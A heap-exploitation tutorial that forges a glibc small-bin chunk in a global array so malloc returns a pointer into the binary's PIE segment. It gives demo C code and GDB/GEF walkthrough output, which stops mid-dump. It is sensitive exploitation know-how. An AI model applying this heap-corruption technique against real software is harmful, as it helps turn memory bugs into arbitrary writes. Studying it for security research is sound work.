# Small Bin Linked List

So the objective this time around, will be to get malloc to allocate a chunk to the PIE segment of the binary, leveraging the small bin.

Here is the code for that:
```
#include <stdio.h>
#include <stdlib.h>

#define CHUNK_SIZE0 0x300
#define CHUNK_SIZE1 0x080
#define CHUNK_SIZE2 0x500

long long_array[100];

void main() {
    int i;
    long *chunk0,
            *chunk1;

    char *tcache_chunks[7];

    // So the goal of this, is to get malloc to allocate a ptr to `long_array` (from the PIE segment)
    // We will leverage the small bin to do this, via making a fake chunk at where we want to allocate it
    // and insert it into the small bin

    // First, in order to insert chunks into the small bin
    // We will have to fill up the corresponding tcache bin
    // So we go ahead and allocate those chunks now

    for (i = 0; i < 7; i++) {
        tcache_chunks[i] = malloc(CHUNK_SIZE0);
    }

    // Allocate our two chunks which will be inserted into the small bin
    // along with chunks in between to prevent consolidation

    chunk0 = malloc(CHUNK_SIZE0);
    malloc(CHUNK_SIZE1);
    chunk1 = malloc(CHUNK_SIZE0);
    malloc(CHUNK_SIZE1);

    // Now we fill up the corresponding tcache

    for (i = 0; i < 7; i++) {
        free(tcache_chunks[i]);
    }

    // Insert our two (soon to be small bin) chunks into the unsorted bin

    free(chunk0);
    free(chunk1);

    // Move the two unsorted bin chunks over to the small bin

    malloc(CHUNK_SIZE2);

    // Then, in order to allocate a small bin chunk
    // we will have to empty the corresponding tcache bin

    for (i = 0; i < 7; i++) {
        tcache_chunks[i] = malloc(CHUNK_SIZE0);
    }

    // Now, let's go ahead, make our "fake" small bin chunk
    // For this, we only need to set the `prev_size` (setting it to `0x00`), and the chunk_size

    long_array[0] = 0x0000000000000000;
    long_array[1] = 0x0000000000000311;

    // Then we go ahead, and link this chunk against the two real small bin chunks

    long_array[2] = ((long)chunk0 - 0x10); // Fwd
    long_array[3] = ((long)chunk1 - 0x10); // Bk

    // Now in other writeups here where we do similar things with the unsorted bin / large bin
    // You will see us have to make a chunk header right after this chunk because of the 'unlink_chunk' function
    // We don't have to worry about that here

    // And we go ahead, and link the two real small bin chunks against our fake small bin chunk

    chunk0[1] = &long_array[0]; // Chunk0 bk
    chunk1[0] = &long_array[0]; // Chunk1 fwd

    // Now we are ready, all that is left to do is allocate the chunk.

    // Similar to the fastbin, since the tcache has bins for the same sizes the small bin does
    // When a small bin chunk is allocate, it will attempt to move as many chunks as it can
    // Over to the corresponding tcache bin. This doesn't really affect us too much here,
    // Just good to keep in mind. Although it does flip the order of chunks, so we will need an extra malloc

    // Reallocate chunk0 from small bin
    malloc(CHUNK_SIZE0);

    // Reallocate chunk1 from tcache
    malloc(CHUNK_SIZE0);

    // Allocate our PIE chunk (to long_array) from tcache
    malloc(CHUNK_SIZE0);
}
```

## Walkthrough

This will be similar to the unsorted, and large bin linked list writeups. We will make a fake chunk where we want to allocate, assign it a `prev_size`, `chunk_size`, and `fwd/bk` pointer. We will also overwrite the `fwd/bk` pointers of the chunks we are linking against, to point to this chunk (either the `fwd/bk` of each).

This differs fron the unsorted / large bin, in two ways. First off, due to the overlap of the tcache bin sizes, whenever we free a chunk that is to be inserted into the small bin, the corresponding tcache must be full. In addition to that, when we want to allocate a small bin chunk, the corresponding tcache bin must be empty.

The second way is beneficial to us. With the unsorted, and large bins, the chunk being allocated has a check (sometimes executed in the `unlink_chunk` function). That check is basically, is the prev_size of the next chunk, equal to the size of the current chunk? Of course for making a fake chunk, this could prove a bit hard to pull off. We don't have to worry about that with the small bin.

Also, another thing that I'd like to point out. A lot of the time, the amount of data we can write to a heap chunk is directly tied to the size of the chunk. However, since all we are really doing is just making a fake chunk, we can just make this fake chunk header within `0x300` bytes of a piece of data we want to overwrite, then allocate a chunk there of size `0x300` and overwrite that data.

That being said, let's see this in action:

```
$   gdb ./small_linked
GNU gdb (Ubuntu 12.0.90-0ubuntu1) 12.0.90
Copyright (C) 2022 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
GEF for linux ready, type `gef' to start, `gef config' to configure
88 commands loaded and 5 functions added for GDB 12.0.90 in 0.01ms using Python engine 3.10
Reading symbols from ./small_linked...
(No debugging symbols found in ./small_linked)
gef➤  disas main
Dump of assembler code for function main:
   0x0000000000001189 <+0>: endbr64
   0x000000000000118d <+4>: push   rbp
   0x000000000000118e <+5>: mov rbp,rsp
   0x0000000000001191 <+8>: sub rsp,0x60
   0x0000000000001195 <+12>:    mov rax,QWORD PTR fs:0x28
   0x000000000000119e <+21>:    mov QWORD PTR [rbp-0x8],rax
   0x00000000000011a2 <+25>:    xor eax,eax
   0x00000000000011a4 <+27>:    mov DWORD PTR [rbp-0x54],0x0
   0x00000000000011ab <+34>:    jmp 0x11c8 <main+63>
   0x00000000000011ad <+36>:    mov edi,0x300
   0x00000000000011b2 <+41>:    call   0x1090 <malloc@plt>
   0x00000000000011b7 <+46>:    mov rdx,rax
   0x00000000000011ba <+49>:    mov eax,DWORD PTR [rbp-0x54]
   0x00000000000011bd <+52>:    cdqe   
   0x00000000000011bf <+54>:    mov QWORD PTR [rbp+rax*8-0x40],rdx
   0x00000000000011c4 <+59>:    add DWORD PTR [rbp-0x54],0x1
   0x00000000000011c8 <+63>:    cmp DWORD PTR [rbp-0x54],0x6
   0x00000000000011cc <+67>:    jle 0x11ad <main+36>
   0x00000000000011ce <+69>:    mov edi,0x300
   0x00000000000011d3 <+74>:    call   0x1090 <malloc@plt>
   0x00000000000011d8 <+79>:    mov QWORD PTR [rbp-0x50],rax
   0x00000000000011dc <+83>:    mov edi,0x80
   0x00000000000011e1 <+88>:    call   0x1090 <malloc@plt>
   0x00000000000011e6 <+93>:    mov edi,0x300
   0x00000000000011eb <+98>:    call   0x1090 <malloc@plt>
   0x00000000000011f0 <+103>:   mov QWORD PTR [rbp-0x48],rax
   0x00000000000011f4 <+107>:   mov edi,0x80
   0x00000000000011f9 <+112>:   call   0x1090 <malloc@plt>
   0x00000000000011fe <+117>:   mov DWORD PTR [rbp-0x54],0x0
   0x0000000000001205 <+124>:   jmp 0x121d <main+148>
   0x0000000000001207 <+126>:   mov eax,DWORD PTR [rbp-0x54]
   0x000000000000120a <+129>:   cdqe   
   0x000000000000120c <+131>:   mov rax,QWORD PTR [rbp+rax*8-0x40]
   0x0000000000001211 <+136>:   mov rdi,rax
   0x0000000000001214 <+139>:   call   0x1070 <free@plt>
   0x0000000000001219 <+144>:   add DWORD PTR [rbp-0x54],0x1
   0x000000000000121d <+148>:   cmp DWORD PTR [rbp-0x54],0x6
   0x0000000000001221 <+152>:   jle 0x1207 <main+126>
   0x0000000000001223 <+154>:   mov rax,QWORD PTR [rbp-0x50]
   0x0000000000001227 <+158>:   mov rdi,rax
   0x000000000000122a <+161>:   call   0x1070 <free@plt>
   0x000000000000122f <+166>:   mov rax,QWORD PTR [rbp-0x48]
   0x0000000000001233 <+170>:   mov rdi,rax
   0x0000000000001236 <+173>:   call   0x1070 <free@plt>
   0x000000000000123b <+178>:   mov edi,0x500
   0x0000000000001240 <+183>:   call   0x1090 <malloc@plt>
   0x0000000000001245 <+188>:   mov DWORD PTR [rbp-0x54],0x0
   0x000000000000124c <+195>:   jmp 0x1269 <main+224>
   0x000000000000124e <+197>:   mov edi,0x300
   0x0000000000001253 <+202>:   call   0x1090 <malloc@plt>
   0x0000000000001258 <+207>:   mov rdx,rax
   0x000000000000125b <+210>:   mov eax,DWORD PTR [rbp-0x54]
   0x000000000000125e <+213>:   cdqe   
   0x0000000000001260 <+215>:   mov QWORD PTR [rbp+rax*8-0x40],rdx
   0x0000000000001265 <+220>:   add DWORD PTR [rbp-0x54],0x1
   0x0000000000001269 <+224>:   cmp DWORD PTR [rbp-0x54],0x6
   0x000000000000126d <+228>:   jle 0x124e <main+197>
   0x000000000000126f <+230>:   mov QWORD PTR [rip+0x2dc6],0x0      # 0x4040 <long_array>
   0x000000000000127a <+241>:   mov QWORD PTR [rip+0x2dc3],0x311        # 0x4048 <long_array+8>
   0x0000000000001285 <+252>:   mov rax,QWORD PTR [rbp-0x50]
   0x0000000000001289 <+256>:   sub rax,0x10
   0x000000000000128d <+260>:   mov QWORD PTR [rip+0x2dbc],rax      # 0x4050 <long_array+16>
   0x0000000000001294 <+267>:   mov rax,QWORD PTR [rbp-0x48]
   0x0000000000001298 <+271>:   sub rax,0x10
   0x000000000000129c <+275>:   mov QWORD PTR [rip+0x2db5],rax      # 0x4058 <long_array+24>
   0x00000000000012a3 <+282>:   mov rax,QWORD PTR [rbp-0x50]
   0x00000000000012a7 <+286>:   add rax,0x8
   0x00000000000012ab <+290>:   lea rdx,[rip+0x2d8e]        # 0x4040 <long_array>
   0x00000000000012b2 <+297>:   mov QWORD PTR [rax],rdx
   0x00000000000012b5 <+300>:   lea rdx,[rip+0x2d84]        # 0x4040 <long_array>
   0x00000000000012bc <+307>:   mov rax,QWORD PTR [rbp-0x48]
   0x00000000000012c0 <+311>:   mov QWORD PTR [rax],rdx
   0x00000000000012c3 <+314>:   mov edi,0x300
   0x00000000000012c8 <+319>:   call   0x1090 <malloc@plt>
   0x00000000000012cd <+324>:   mov edi,0x300
   0x00000000000012d2 <+329>:   call   0x1090 <malloc@plt>
   0x00000000000012d7 <+334>:   mov edi,0x300
   0x00000000000012dc <+339>:   call   0x1090 <malloc@plt>
   0x00000000000012e1 <+344>:   nop
   0x00000000000012e2 <+345>:   mov rax,QWORD PTR [rbp-0x8]
   0x00000000000012e6 <+349>:   sub rax,QWORD PTR fs:0x28
   0x00000000000012ef <+358>:   je  0x12f6 <main+365>
   0x00000000000012f1 <+360>:   call   0x1080 <__stack_chk_fail@plt>
   0x00000000000012f6 <+365>:   leave  
   0x00000000000012f7 <+366>:   ret    
End of assembler dump.
gef➤  b *main+230
Breakpoint 1 at 0x126f
gef➤  b *main+319
Breakpoint 2 at 0x12c8
gef➤  b *main+329
Breakpoint 3 at 0x12d2
gef➤  b *main+339
Breakpoint 4 at 0x12dc
gef➤  b *main+344
Breakpoint 5 at 0x12e1
gef➤  r
Starting program: /Hackery/shogun/pwn_demos/small_bin/linked_list/small_linked
warning: File "/home/guy/glibc-2.38/compiled-2.38/lib/libthread_db.so.1" auto-loading has been declined by your `auto-load safe-path' set to "$debugdir:$datadir/auto-load".
To enable execution of this file add
    add-auto-load-safe-path /home/guy/glibc-2.38/compiled-2.38/lib/libthread_db.so.1
line to your configuration file "/home/guy/.gdbinit".
To completely disable this security protection add
    set auto-load safe-path /
line to your configuration file "/home/guy/.gdbinit".
For more information about this security protection see the
"Auto-loading safe path" section in the GDB manual.  E.g., run from the shell:
    info "(gdb)Auto-loading safe path"
warning: Unable to find libthread_db matching inferior's thread library, thread debugging will not be available.

Breakpoint 1, 0x000055555555526f in main ()

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x6             
$rbx   : 0x0             
$rcx   : 0x0             
$rdx   : 0x00005555555592a0  →  0x0000000555555559
$rsp   : 0x00007fffffffdf60  →  0x0000000800000017
$rbp   : 0x00007fffffffdfc0  →  0x0000000000000001
$rsi   : 0x0             
$rdi   : 0x3f            
$rip   : 0x000055555555526f  →  <main+230> mov QWORD PTR [rip+0x2dc6], 0x0      # 0x555555558040 <long_array>
$r8 : 0x3            
$r9 : 0x0            
$r10   : 0x20000         
$r11   : 0x00007ffff7e2cca0  →  0x0000000000000000
$r12   : 0x00007fffffffe0d8  →  0x00007fffffffe3dc  →  "/Hackery/shogun/pwn_demos/small_bin/linke[...]"
$r13   : 0x0000555555555189  →  <main+0> endbr64
$r14   : 0x0000555555557da0  →  0x0000555555555140  →  <__do_global_dtors_aux+0> endbr64
$r15   : 0x00007ffff7ffd020  →  0x00007ffff7ffe2e0  →  0x0000555555554000  →   jg 0x555555554047
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdf60│+0x0000: 0x0000000800000017   ← $rsp
0x00007fffffffdf68│+0x0008: 0x0000000700000002
0x00007fffffffdf70│+0x0010: 0x000055555555a810  →  0x00007ffff7e2d000  →  0x00007ffff7e2cff0  →  0x00007ffff7e2cfe0  →  0x00007ffff7e2cfd0  →  0x00007ffff7e2cfc0  →  0x00007ffff7e2cfb0
0x00007fffffffdf78│+0x0018: 0x000055555555abb0  →  0x000055555555a800  →  0x0000000000000000
0x00007fffffffdf80│+0x0020: 0x000055555555a500  →  0x000055500000f4aa
0x00007fffffffdf88│+0x0028: 0x000055555555a1f0  →  0x000055500000cbba
0x00007fffffffdf90│+0x0030: 0x0000555555559ee0  →  0x000055500000ce89
0x00007fffffffdf98│+0x0038: 0x0000555555559bd0  →  0x000055500000cd99
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x555555555265 <main+220>    add DWORD PTR [rbp-0x54], 0x1
   0x555555555269 <main+224>    cmp DWORD PTR [rbp-0x54], 0x6
   0x55555555526d <main+228>    jle 0x55555555524e <main+197>
 → 0x55555555526f <main+230>    mov QWORD PTR [rip+0x2dc6], 0x0     # 0x555555558040 <long_array>
   0x55555555527a <main+241>    mov QWORD PTR [rip+0x2dc3], 0x311       # 0x555555558048 <long_array+8>
   0x555555555285 <main+252>    mov rax, QWORD PTR [rbp-0x50]
   0x555555555289 <main+256>    sub rax, 0x10
   0x55555555528d <main+260>    mov QWORD PTR [rip+0x2dbc], rax     # 0x555555558050 <long_array+16>
   0x555555555294 <main+267>    mov rax, QWORD PTR [rbp-0x48]
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "small_linked", stopped 0x55555555526f in main (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x55555555526f → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  heap bins
────────────────────────────────────── Tcachebins for thread 1 ──────────────────────────────────────
All tcachebins are empty
─────────────────────────────── Fastbins for arena at 0x7ffff7e2cca0 ───────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
───────────────────────────── Unsorted Bin for arena at 0x7ffff7e2cca0 ─────────────────────────────
[+] Found 0 chunks in unsorted bin.
────────────────────────────── Small Bins for arena at 0x7ffff7e2cca0 ──────────────────────────────
[+] small_bins[48]: fw=0x55555555aba0, bk=0x55555555a800
 →   Chunk(addr=0x55555555abb0, size=0x310, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)   →   Chunk(addr=0x55555555a810, size=0x310, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
[+] Found 2 chunks in 1 small non-empty bins.
────────────────────────────── Large Bins for arena at 0x7ffff7e2cca0 ──────────────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
gef➤  x/20g 0x55555555aba0
0x55555555aba0: 0x0 0x311
0x55555555abb0: 0x55555555a800  0x7ffff7e2d000
0x55555555abc0: 0x0 0x0
0x55555555abd0: 0x0 0x0
0x55555555abe0: 0x0 0x0
0x55555555abf0: 0x0 0x0
0x55555555ac00: 0x0 0x0
0x55555555ac10: 0x0 0x0
0x55555555ac20: 0x0 0x0
0x55555555ac30: 0x0 0x0
gef➤  x/20g 0x55555555a800
0x55555555a800: 0x0 0x311
0x55555555a810: 0x7ffff7e2d000  0x55555555aba0
0x55555555a820: 0x0 0x0
0x55555555a830: 0x0 0x0
0x55555555a840: 0x0 0x0
0x55555555a850: 0x0 0x0
0x55555555a860: 0x0 0x0
0x55555555a870: 0x0 0x0
0x55555555a880: 0x0 0x0
0x55555555a890: 0x0 0x0
```

So we see here, we have our two small bin chunks. I skipped the tcache steps needed to actually get chunks into the small bin. Let's see what that small bin looks like after we have made, and linked in our fake chunk:

```
gef➤  c
Continuing.

Breakpoint 2, 0x00005555555552c8 in main ()

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x000055555555abb0  →  0x0000555555558040  →  <long_array+0> add BYTE PTR [rax], al
$rbx   : 0x0             
$rcx   : 0x0             
$rdx   : 0x0000555555558040  →  <long_array+0> add BYTE PTR [rax], al
$rsp   : 0x00007fffffffdf60  →  0x0000000800000017
$rbp   : 0x00007fffffffdfc0  →  0x0000000000000001
$rsi   : 0x0             
$rdi   : 0x300           
$rip   : 0x00005555555552c8  →  <main+319> call 0x555555555090 <malloc@plt>
$r8 : 0x3            
$r9 : 0x0            
$r10   : 0x20000         
$r11   : 0x00007ffff7e2cca0  →  0x0000000000000000
$r12   : 0x00007fffffffe0d8  →  0x00007fffffffe3dc  →  "/Hackery/shogun/pwn_demos/small_bin/linke[...]"
$r13   : 0x0000555555555189  →  <main+0> endbr64
$r14   : 0x0000555555557da0  →  0x0000555555555140  →  <__do_global_dtors_aux+0> endbr64
$r15   : 0x00007ffff7ffd020  →  0x00007ffff7ffe2e0  →  0x0000555555554000  →   jg 0x555555554047
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdf60│+0x0000: 0x0000000800000017   ← $rsp
0x00007fffffffdf68│+0x0008: 0x0000000700000002
0x00007fffffffdf70│+0x0010: 0x000055555555a810  →  0x00007ffff7e2d000  →  0x00007ffff7e2cff0  →  0x00007ffff7e2cfe0  →  0x00007ffff7e2cfd0  →  0x00007ffff7e2cfc0  →  0x00007ffff7e2cfb0
0x00007fffffffdf78│+0x0018: 0x000055555555abb0  →  0x0000555555558040  →  <long_array+0> add BYTE PTR [rax], al
0x00007fffffffdf80│+0x0020: 0x000055555555a500  →  0x000055500000f4aa
0x00007fffffffdf88│+0x0028: 0x000055555555a1f0  →  0x000055500000cbba
0x00007fffffffdf90│+0x0030: 0x0000555555559ee0  →  0x000055500000ce89
0x00007fffffffdf98│+0x0038: 0x0000555555559bd0  →  0x000055500000cd99
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x5555555552bc <main+307>    mov rax, QWORD PTR [rbp-0x48]
   0x5555555552c0 <main+311>    mov QWORD PTR [rax], rdx
   0x5555555552c3 <main+314>    mov edi, 0x300
 → 0x5555555552c8 <main+319>    call   0x555555555090 <malloc@plt>
   ↳  0x555555555090 <malloc@plt+0>   endbr64
    0x555555555094 <malloc@plt+4>   bnd jmp QWORD PTR [rip+0x2f35]      # 0x555555557fd0 <malloc@got.plt>
    0x55555555509b <malloc@plt+11>  nop DWORD PTR [rax+rax*1+0x0]
    0x5555555550a0 <_start+0>       endbr64
    0x5555555550a4 <_start+4>       xor ebp, ebp
    0x5555555550a6 <_start+6>       mov r9, rdx
──────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
malloc@plt (
   $rdi = 0x0000000000000300,
   $rsi = 0x0000000000000000,
   $rdx = 0x0000555555558040 → <long_array+0> add BYTE PTR [rax], al
)
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "small_linked", stopped 0x5555555552c8 in main (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x5555555552c8 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  heap bins
────────────────────────────────────── Tcachebins for thread 1 ──────────────────────────────────────
All tcachebins are empty
─────────────────────────────── Fastbins for arena at 0x7ffff7e2cca0 ───────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
───────────────────────────── Unsorted Bin for arena at 0x7ffff7e2cca0 ─────────────────────────────
[+] Found 0 chunks in unsorted bin.
────────────────────────────── Small Bins for arena at 0x7ffff7e2cca0 ──────────────────────────────
[+] small_bins[48]: fw=0x55555555aba0, bk=0x55555555a800
 →   Chunk(addr=0x55555555abb0, size=0x310, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)   →   Chunk(addr=0x555555558050, size=0x310, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)   →   Chunk(addr=0x55555555a810, size=0x310, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
[+] Found 3 chunks in 1 small non-empty bins.
────────────────────────────── Large Bins for arena at 0x7ffff7e2cca0 ──────────────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
gef➤  x/20g 0x55555555aba0
0x55555555aba0: 0x0 0x311
0x55555555abb0: 0x555555558040  0x7ffff7e2d000
0x55555555abc0: 0x0 0x0
0x55555555abd0: 0x0 0x0
0x55555555abe0: 0x0 0x0
0x55555555abf0: 0x0 0x0
0x55555555ac00: 0x0 0x0
0x55555555ac10: 0x0 0x0
0x55555555ac20: 0x0 0x0
0x55555555ac30: 0x0 0x0
gef➤  x/20g 0x555555558040
0x555555558040 <long_array>:    0x0 0x311
0x555555558050 <long_array+16>: 0x55555555a800  0x55555555aba0
0x555555558060 <long_array+32>: 0x0 0x0
0x555555558070 <long_array+48>: 0x0 0x0
0x555555558080 <long_array+64>: 0x0 0x0
0x555555558090 <long_array+80>: 0x0 0x0
0x5555555580a0 <long_array+96>: 0x0 0x0
0x5555555580b0 <long_array+112>:    0x0 0x0
0x5555555580c0 <long_array+128>:    0x0 0x0
0x5555555580d0 <long_array+144>:    0x0 0x0
gef➤  x/20g 0x55555555a800
0x55555555a800: 0x0 0x311
0x55555555a810: 0x7ffff7e2d000  0x555555558040
0x55555555a820: 0x0 0x0
0x55555555a830: 0x0 0x0
0x55555555a840: 0x0 0x0
0x55555555a850: 0x0 0x0
0x55555555a860: 0x0 0x0
0x55555555a870: 0x0 0x0
0x55555555a880: 0x0 0x0
0x55555555a890: 0x0 0x0
```

So we see here, our fake chunk at `0x555555558040` has been linked, against our two small bin chunks `0x55555555aba0/0x55555555a800`. Let's go ahead and allocate the `0x55555555a800` chunk, which will cause the other two chunks to be moved over to the tcache:

```
gef➤  c
Continuing.

Breakpoint 3, 0x00005555555552d2 in main ()

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x000055555555a810  →  0x00007ffff7e2d000  →  0x00007ffff7e2cff0  →  0x00007ffff7e2cfe0  →  0x00007ffff7e2cfd0  →  0x00007ffff7e2cfc0  →  0x00007ffff7e2cfb0  →  0x00007ffff7e2cfa0
$rbx   : 0x0             
$rcx   : 0x00007ffff7e2d000  →  0x00007ffff7e2cff0  →  0x00007ffff7e2cfe0  →  0x00007ffff7e2cfd0  →  0x00007ffff7e2cfc0  →  0x00007ffff7e2cfb0  →  0x00007ffff7e2cfa0  →  0x00007ffff7e2cf90
$rdx   : 0x0             
$rsp   : 0x00007fffffffdf60  →  0x0000000800000017
$rbp   : 0x00007fffffffdfc0  →  0x0000000000000001
$rsi   : 0x0             
$rdi   : 0x300           
$rip   : 0x00005555555552d2  →  <main+329> call 0x555555555090 <malloc@plt>
$r8 : 0x2f           
$r9 : 0x0000555555559010  →  0x0000000000000000
$r10   : 0x00007ffff7e2cca0  →  0x0000000000000000
$r11   : 0x00007ffff7e2cca0  →  0x0000000000000000
$r12   : 0x00007fffffffe0d8  →  0x00007fffffffe3dc  →  "/Hackery/shogun/pwn_demos/small_bin/linke[...]"
$r13   : 0x0000555555555189  →  <main+0> endbr64
$r14   : 0x0000555555557da0  →  0x0000555555555140  →  <__do_global_dtors_aux+0> endbr64
$r15   : 0x00007ffff7ffd020  →  0x00007ffff7ffe2e0  →  0x0000555555554000  →   jg 0x555555554047
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdf60│+0x0000: 0x0000000800000017   ← $rsp
0x00007fffffffdf68│+0x0008: 0x0000000700000002
0x00007fffffffdf70│+0x0010: 0x000055555555a810  →  0x00007ffff7e2d000  →  0x00007ffff7e2cff0  →  0x00007ffff7e2cfe0  →  0x00007ffff7e2cfd0  →  0x00007ffff7e2cfc0  →  0x00007ffff7e2cfb0
0x00007fffffffdf78│+0x0018: 0x000055555555abb0  →  0x000055500000d50a
0x00007fffffffdf80│+0x0020: 0x000055555555a500  →  0x000055500000f4aa
0x00007fffffffdf88│+0x0028: 0x000055555555a1f0  →  0x000055500000cbba
0x00007fffffffdf90│+0x0030: 0x0000555555559ee0  →  0x000055500000ce89
0x00007fffffffdf98│+0x0038: 0x0000555555559bd0  →  0x000055500000cd99
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x5555555552c3 <main+314>    mov edi, 0x300
   0x5555555552c8 <main+319>    call   0x555555555090 <malloc@plt>
   0x5555555552cd <main+324>    mov edi, 0x300
 → 0x5555555552d2 <main+329>    call   0x555555555090 <malloc@plt>
   ↳  0x555555555090 <malloc@plt+0>   endbr64
    0x555555555094 <malloc@plt+4>   bnd jmp QWORD PTR [rip+0x2f35]      # 0x555555557fd0 <malloc@got.plt>
    0x55555555509b <malloc@plt+11>  nop DWORD PTR [rax+rax*1+0x0]
    0x5555555550a0 <_start+0>       endbr64
    0x5555555550a4 <_start+4>       xor ebp, ebp
    0x5555555550a6 <_start+6>       mov r9, rdx
──────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
malloc@plt (
   $rdi = 0x0000000000000300
)
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "small_linked", stopped 0x5555555552d2 in main (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x5555555552d2 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  p $rax
$1 = 0x55555555a810
gef➤  heap bins
────────────────────────────────────── Tcachebins for thread 1 ──────────────────────────────────────
Tcachebins[idx=47, size=0x310, count=2] ←  Chunk(addr=0x55555555abb0, size=0x310, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x555555558050, size=0x310, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
─────────────────────────────── Fastbins for arena at 0x7ffff7e2cca0 ───────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
───────────────────────────── Unsorted Bin for arena at 0x7ffff7e2cca0 ─────────────────────────────
[+] Found 0 chunks in unsorted bin.
────────────────────────────── Small Bins for arena at 0x7ffff7e2cca0 ──────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
────────────────────────────── Large Bins for arena at 0x7ffff7e2cca0 ──────────────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
gef➤  x/20g 0x55555555aba0
0x55555555aba0: 0x0 0x311
0x55555555abb0: 0x55500000d50a  0x6b38570d0a3b0522
0x55555555abc0: 0x0 0x0
0x55555555abd0: 0x0 0x0
0x55555555abe0: 0x0 0x0
0x55555555abf0: 0x0 0x0
0x55555555ac00: 0x0 0x0
0x55555555ac10: 0x0 0x0
0x55555555ac20: 0x0 0x0
0x55555555ac30: 0x0 0x0
gef➤  x/20g 0x555555558040
0x555555558040 <long_array>:    0x0 0x311
0x555555558050 <long_array+16>: 0x555555558 0x6b38570d0a3b0522
0x555555558060 <long_array+32>: 0x0 0x0
0x555555558070 <long_array+48>: 0x0 0x0
0x555555558080 <long_array+64>: 0x0 0x0
0x555555558090 <long_array+80>: 0x0 0x0
0x5555555580a0 <long_array+96>: 0x0 0x0
0x5555555580b0 <long_array+112>:    0x0 0x0
0x5555555580c0 <long_array+128>:    0x0 0x0
0x5555555580d0 <long_array+144>:    0x0 0x0
gef➤  vmmap 0x55555555a810
[ Legend:  Code | Heap | Stack ]
Start           End             Offset          Perm Path
0x0000555555559000 0x000055555557a000 0x0000000000000000 rw- [heap]
```

Now let's allocate the `0x55555555aba0` chunk, so that with the following allocation we will actually get a ptr to `long_array`:

```
gef➤  c
Continuing.

Breakpoint 4, 0x00005555555552dc in main ()

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x000055555555abb0  →  0x000055500000d50a
$rbx   : 0x0             
$rcx   : 0x1             
$rdx   : 0x0000555555559010  →  0x0000000000000000
$rsp   : 0x00007fffffffdf60  →  0x0000000800000017
$rbp   : 0x00007fffffffdfc0  →  0x0000000000000001
$rsi   : 0x0000555555558050  →  <long_array+16> pop rax
$rdi   : 0x300           
$rip   : 0x00005555555552dc  →  <main+339> call 0x555555555090 <malloc@plt>
$r8 : 0x2f           
$r9 : 0x0000555555559010  →  0x0000000000000000
